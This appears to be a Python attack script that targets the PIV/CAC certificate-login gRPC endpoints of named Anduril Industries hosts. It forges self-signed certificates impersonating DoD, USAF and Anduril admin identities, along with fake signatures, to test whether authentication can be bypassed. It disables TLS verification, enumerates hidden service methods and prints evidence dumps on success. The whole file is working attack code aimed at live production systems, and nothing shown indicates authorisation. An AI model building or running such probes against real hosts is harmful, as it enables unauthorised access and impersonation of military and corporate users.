#!/usr/bin/env python3
"""
PHASE 1 — Test 1: PivIdp/LoginSignedCert and PivIdp/LoginSignedCertWithPIV
Target: catalog.anduril.com, sandboxes.developer.anduril.com

Intent: Determine whether the PIV/CAC certificate validator checks the issuer
against a trusted CA chain. If it accepts a self-signed cert, an attacker can
impersonate any named military user without hardware access.

Evidence collection: Capture ALL gRPC status codes and error messages verbatim.
Key signals:
  grpc-status:0              → CRITICAL, stop and document immediately
  "user not found"           → cert structure accepted, CA check missing
  "invalid certificate"      → CA chain validated, dead end
  "cert verification failed" → CA chain validated, dead end
  grpc-status:16 (UNAUTHENTICATED) → endpoint requires a prior JWT (Layer 2 active)
"""
import struct, time, datetime, json, sys
import requests
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa

requests.packages.urllib3.disable_warnings()

# ─── protobuf helpers ────────────────────────────────────────────────────────

def _vi(v):
    r = b""
    while True:
        b = v & 0x7F; v >>= 7
        r += bytes([b | 0x80]) if v else bytes([b])
        if not v: break
    return r

def proto_str(fn, s):
    v = s.encode(); return _vi((fn << 3) | 2) + _vi(len(v)) + v

def proto_bytes(fn, b):
    return _vi((fn << 3) | 2) + _vi(len(b)) + b

def proto_vi(fn, v):
    return _vi((fn << 3) | 0) + _vi(v)

def grpc_frame(b):
    return b"\x00" + struct.pack(">I", len(b)) + b

def parse_grpc_response(r):
    """Extract gRPC status, message, and any data payload from an HTTP response."""
    status = r.headers.get("grpc-status", "?")
    msg = r.headers.get("grpc-message", "")
    try:
        import urllib.parse; msg = urllib.parse.unquote(msg)
    except Exception:
        pass
    data = b""
    raw = r.content
    i = 0
    while i < len(raw):
        if i + 5 > len(raw): break
        ft = raw[i]; fl = struct.unpack(">I", raw[i+1:i+5])[0]
        fb = raw[i+5:i+5+fl]; i += 5 + fl
        if ft == 0x00:
            data = fb
        elif ft == 0x80:
            for line in fb.decode("utf-8", "replace").split("\r\n"):
                if line.startswith("grpc-status:"):
                    status = line.split(":", 1)[1].strip()
                elif line.startswith("grpc-message:"):
                    msg = line.split(":", 1)[1].strip()
                    try:
                        import urllib.parse; msg = urllib.parse.unquote(msg)
                    except Exception:
                        pass
    readable = "".join(chr(c) if 32 <= c < 127 else "." for c in data)
    return status, msg, data, readable

def grpc_call(host, svc, body, label, extra_headers=None, delay=0.5):
    S = requests.Session(); S.verify = False
    hdrs = {"content-type": "application/grpc-web+proto", "x-grpc-web": "1"}
    if extra_headers:
        hdrs.update(extra_headers)
    url = f"https://{host}/{svc}"
    try:
        r = S.post(url, data=grpc_frame(body), headers=hdrs, timeout=12)
        status, msg, data, readable = parse_grpc_response(r)
        flag = "  *** CRITICAL: grpc-status=0 — STOP AND DOCUMENT ***" if status == "0" else ""
        print(f"  [{label:50s}]  HTTP={r.status_code}  grpc={status}  {msg[:100]}{flag}")
        if data:
            print(f"    DATA({len(data)}B): {data.hex()[:80]}  |  {readable[:120]}")
        if status == "0" and data:
            print()
            print("  !!! CRITICAL FINDING — EVIDENCE DUMP !!!")
            print(f"  URL: {url}")
            print(f"  Request body (hex): {grpc_frame(body).hex()}")
            print(f"  Response headers: {dict(r.headers)}")
            print(f"  Response body (hex): {r.content.hex()}")
            print(f"  Data (decoded): {readable}")
            sys.stdout.flush()
        time.sleep(delay)
        return r.status_code, status, msg, data
    except Exception as e:
        print(f"  [{label:50s}]  ERROR: {e}")
        return None, None, str(e), b""

# ─── generate self-signed test certificates ──────────────────────────────────

def make_cert(subject_name_obj, key):
    """Create a self-signed DER certificate with the given subject."""
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject_name_obj)
        .issuer_name(subject_name_obj)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.datetime.utcnow())
        .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=3650))
        .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)
        .sign(key, hashes.SHA256())
    )
    return cert.public_bytes(serialization.Encoding.DER)

print("=" * 70)
print("  Generating RSA key pair for self-signed certs...")
key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
print("  Key generated.")
print()

# Subject DN variants matching expected military/enterprise PKI patterns
cert_subjects = {
    "dod_cac": x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, "SMITH.JOHN.A.1234567890"),
        x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, "DoD"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "U.S. Government"),
        x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
    ]),
    "anduril_email": x509.Name([
        x509.NameAttribute(NameOID.EMAIL_ADDRESS, "admin@anduril.com"),
        x509.NameAttribute(NameOID.COMMON_NAME, "admin@anduril.com"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Anduril Industries"),
    ]),
    "anduril_employee": x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, "John Smith"),
        x509.NameAttribute(NameOID.EMAIL_ADDRESS, "smith.john@anduril.com"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Anduril Industries"),
        x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
    ]),
    "usaf_format": x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, "USAF.OPERATOR.1234567890@mil"),
        x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, "USAF"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "United States Air Force"),
        x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
    ]),
    "minimal": x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, "admin"),
    ]),
}

certs = {name: make_cert(subj, key) for name, subj in cert_subjects.items()}
print(f"  Generated {len(certs)} certificate variants:")
for name, der in certs.items():
    print(f"    {name}: {len(der)} bytes DER")

# Also create a minimal garbage blob for "cert not parseable" baseline
garbage_cert = b"\x30\x82\x02\x00" + b"\x00" * 50   # malformed DER

print()

HOSTS = [
    ("catalog.anduril.com", "catalog"),
    ("sandboxes.developer.anduril.com", "sandboxes"),
]

SVC_PIV     = "anduril.auth.v2.PivIdp/LoginSignedCert"
SVC_PIV_ALT = "anduril.auth.v2.PivIdp/LoginSignedCertWithPIV"

# ─── Test A: LoginSignedCert ──────────────────────────────────────────────────
print("=" * 70)
print("  TEST A: anduril.auth.v2.PivIdp/LoginSignedCert")
print("=" * 70)
print()
print("  Field layout attempts:")
print("    - field 1 (bytes): raw DER cert")
print("    - field 1 (bytes): cert + field 2 (string): email hint")
print("    - field 2 (bytes): cert (alternate field position)")
print("    - field 1 (string): PEM-encoded cert string")
print()

for host, hlabel in HOSTS:
    print(f"  ══ Host: {host} ══")

    # Baseline: empty body — is there any response at all?
    grpc_call(host, SVC_PIV, b"", f"{hlabel} | empty body")

    # Garbage blob — "what does a non-parseable DER get?"
    grpc_call(host, SVC_PIV,
              proto_bytes(1, garbage_cert),
              f"{hlabel} | field1=malformed DER")

    for cert_name, cert_der in certs.items():
        # Field 1 only
        grpc_call(host, SVC_PIV,
                  proto_bytes(1, cert_der),
                  f"{hlabel} | field1=cert({cert_name})")

        # Field 1 = cert + field 2 = email
        grpc_call(host, SVC_PIV,
                  proto_bytes(1, cert_der) + proto_str(2, "admin@anduril.com"),
                  f"{hlabel} | field1=cert({cert_name})+f2=email")

    # PEM string in field 1 (some implementations accept PEM as a string field)
    pem_str = key.public_key().public_bytes(
        serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo
    ).decode()
    grpc_call(host, SVC_PIV,
              proto_str(1, pem_str[:500]),
              f"{hlabel} | field1=PEM_string")

    # Field 2 position (cert in field 2, email in field 1)
    for cert_name, cert_der in list(certs.items())[:2]:
        grpc_call(host, SVC_PIV,
                  proto_str(1, "admin@anduril.com") + proto_bytes(2, cert_der),
                  f"{hlabel} | f1=email+f2=cert({cert_name})")

    print()

# ─── Test B: LoginSignedCertWithPIV ──────────────────────────────────────────
print("=" * 70)
print("  TEST B: anduril.auth.v2.PivIdp/LoginSignedCertWithPIV")
print("=" * 70)
print()

for host, hlabel in HOSTS:
    print(f"  ══ Host: {host} ══")

    grpc_call(host, SVC_PIV_ALT, b"", f"{hlabel} | empty")

    for cert_name, cert_der in certs.items():
        grpc_call(host, SVC_PIV_ALT,
                  proto_bytes(1, cert_der),
                  f"{hlabel} | field1=cert({cert_name})")

        # PIV often includes: cert (field 1), signature over challenge (field 2), challenge (field 3)
        fake_signature = b"\x30\x45\x02\x21\x00" + b"\xaa" * 32 + b"\x02\x20" + b"\xbb" * 32
        grpc_call(host, SVC_PIV_ALT,
                  proto_bytes(1, cert_der) + proto_bytes(2, fake_signature) + proto_bytes(3, b"challenge_nonce"),
                  f"{hlabel} | cert+sig+challenge({cert_name})")

    print()

# ─── Test C: Additional PIV service name variants ─────────────────────────────
print("=" * 70)
print("  TEST C: PIV service name variants (discovery)")
print("=" * 70)
print()

svc_variants = [
    "anduril.auth.v2.PivIdp/Login",
    "anduril.auth.v2.PivIdp/LoginCert",
    "anduril.auth.v2.PivIdp/AuthenticateWithCert",
    "anduril.auth.v2.PivIdp/ValidateCert",
    "anduril.auth.v2.PivIdp/GetPIVToken",
    "anduril.auth.v2.PivIdp/GetInfo",
]

cert_der = certs["dod_cac"]
for svc in svc_variants:
    grpc_call("catalog.anduril.com", svc,
              proto_bytes(1, cert_der),
              f"catalog | {svc.split('/')[-1]}")

print()
print("=" * 70)
print("  PHASE 1 — TEST 1 COMPLETE")
print("=" * 70)
print()
print("  Interpretation guide:")
print("    grpc-status:0  → CRITICAL — document full req/resp and report")
print("    'user not found' / 'no principal for cert' → CA check absent → HIGH")
print("    'invalid cert' / 'cert parse error' → CA validated → chain closed")
print("    grpc-status:16 (UNAUTHENTICATED) → Layer 2 auth active → Envoy bypass insufficient")
print("    grpc-status:12 (UNIMPLEMENTED) → service exists but this method not deployed")
print("    grpc-status:5  (NOT_FOUND) → service not found (wrong host or wrong svc name)")
